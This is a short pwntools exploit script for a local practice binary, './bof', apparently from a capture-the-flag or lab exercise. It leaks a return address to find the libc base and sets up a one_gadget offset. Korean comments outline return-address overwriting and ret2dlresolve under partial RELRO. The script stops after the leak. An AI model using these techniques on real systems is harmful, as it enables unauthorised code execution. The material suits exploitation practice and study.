from pwn import *

p=process('./bof')
stack=b'y'.ljust(16,b'A')
offset=171408
onegadget=0xef4ce

p.sendline(stack)
p.recvline()
data=p.recvline()[:-1][-6:]+b'\x00'*2
pause()
print(data)



p.interactive()

#얼라인먼트에 대한 지식이 필요함
#objdump -S /lib/x86-64

# y+아무거나 패딩 -> 출력될때 뒤에있는 retrun 주소까지 출력
# -> 출력된 return 주소를 파싱 -> libc_base 주소 확인
# libc_base 주소를 기반으로 gadget 사용해서 return address overwriting
# 전역 변수 partial relo일 경우 GOT overwrite을 쓰기가 어려울때 Return2dlresolve